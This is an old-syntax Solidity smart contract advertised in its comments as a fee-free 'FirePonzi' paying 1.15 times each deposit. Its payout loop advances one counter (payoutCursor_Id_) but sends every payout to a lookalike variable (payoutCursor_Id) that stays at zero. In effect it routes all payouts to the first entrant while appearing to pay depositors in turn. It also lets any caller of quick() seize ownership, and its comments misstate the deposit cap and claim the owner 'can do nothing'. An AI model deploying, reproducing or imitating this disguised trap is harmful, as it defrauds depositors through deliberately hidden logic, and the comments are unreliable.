contract FirePonzi {
   // NO FEE PONZI, 1.15 Multiplier, Limited to 3 Ether deposits, FAST and designed to be on FIRE !
   // Only input and output, no destroy function, owner can do nothing !
   
  struct Player {
      address etherAddress;
      uint deposit;
  }

  Player[] public persons;

  uint public payoutCursor_Id_ = 0;
  uint public balance = 0;

  address public owner;


  uint public payoutCursor_Id=0;
  modifier onlyowner { if (msg.sender == owner) _ }
  function quick() {
    owner = msg.sender;
  }

  function() {
    enter();
  }
  function enter() {
    if (msg.value &lt; 100 finney) { // Only  &gt; 0.1 Eth depoits
        msg.sender.send(msg.value);
        return;
    }
	
	uint deposited_value;
	if (msg.value &gt; 2 ether) { //Maximum 3 Eth per deposit
		msg.sender.send(msg.value - 2 ether);	
		deposited_value = 2 ether;
    }
	else {
		deposited_value = msg.value;
	}


    uint new_id = persons.length;
    persons.length += 1;
    persons[new_id].etherAddress = msg.sender;
    persons[new_id].deposit = deposited_value;
 
    balance += deposited_value;
    


    while (balance &gt; persons[payoutCursor_Id_].deposit / 100 * 115) {
      uint MultipliedPayout = persons[payoutCursor_Id_].deposit / 100 * 115;
      persons[payoutCursor_Id].etherAddress.send(MultipliedPayout);

      balance -= MultipliedPayout;
      payoutCursor_Id_++;
    }
  }


  function setOwner(address _owner) onlyowner {
      owner = _owner;
  }
}